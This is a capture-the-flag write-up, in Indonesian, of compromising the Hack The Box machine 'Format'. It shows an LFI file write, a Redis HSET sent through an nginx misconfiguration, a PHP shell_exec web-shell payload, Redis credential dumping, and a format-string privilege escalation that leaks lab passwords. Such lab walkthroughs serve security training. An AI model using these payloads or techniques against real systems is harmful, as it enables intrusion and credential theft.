## Solver
curl format.htb found subdomain app.microblog.htb, berarti ada domain microblog.htb
tambahkan ke /etc/hosts

Cek microblog.htb:3000 didapatkan repos cooper yang berisi source code microblog.
Cek app.microblog.htb, bisa register dan buat subdomain serta blog

Review source code microblog, yang pertama didapatkan adalah vulnerable dengan LFI pada parameter id
Cek /etc/nginx/sites-enabled/default diketahui ada misconfiguration pada /static/(.*)/(.*) dan proxy pass

Untuk dapat melakukan upload file, harus mendapatkan akses level Pro
Untuk mendapatkan level Pro, harus rubah value pro=false menjadi true di database redis.

Karena ada misconfigurations pada config nginx, maka bisa dimanipulasi untuk redis HSET
https://exploit-notes.hdks.org/exploit/database/redis-pentesting/#get%2Fset-key-value-commands-with-nginx-misconfiguration

User sudah menjadi pro, sekarang adalah upload image agar folder uploads di create
Setelah upload image dan aplikasi membuat folder uploads, lanjut ke write web shell file

```
/edit/index.php
id=/var/www/microblog/banua/uploads/rev.php&txt=<?php+echo+shell_exec('uname+-a');?>
```

Setelah itu webshell didapatkan, tinggal edit command untuk reverse shell

Getting User
================
Karena redis connect menggunakan redis.sock, kita bisa connect dengan file redis.sock tersebut juga dengan www-data
redis-cli -s /var/run/redis/redis.sock

Setelah itu, dump key dengan command KEYS *
cek type key dengan TYPE cooper.dooper, diketahui cooper.dooper adalah type hash

Tinggal HGETALL cooper.dooper dan didapatkan password untuk cooper:zooperdoopercooper

PRIVES
================

HSET ddd username '{license.__init__.__globals__}'
/usr/bin/license -p ddd

Got output dict containing 'secret_encoded': b'unCR4ckaBL3Pa$$w0rd'
Try login as root with password unCR4ckaBL3Pa$$w0rd

Pwned!!!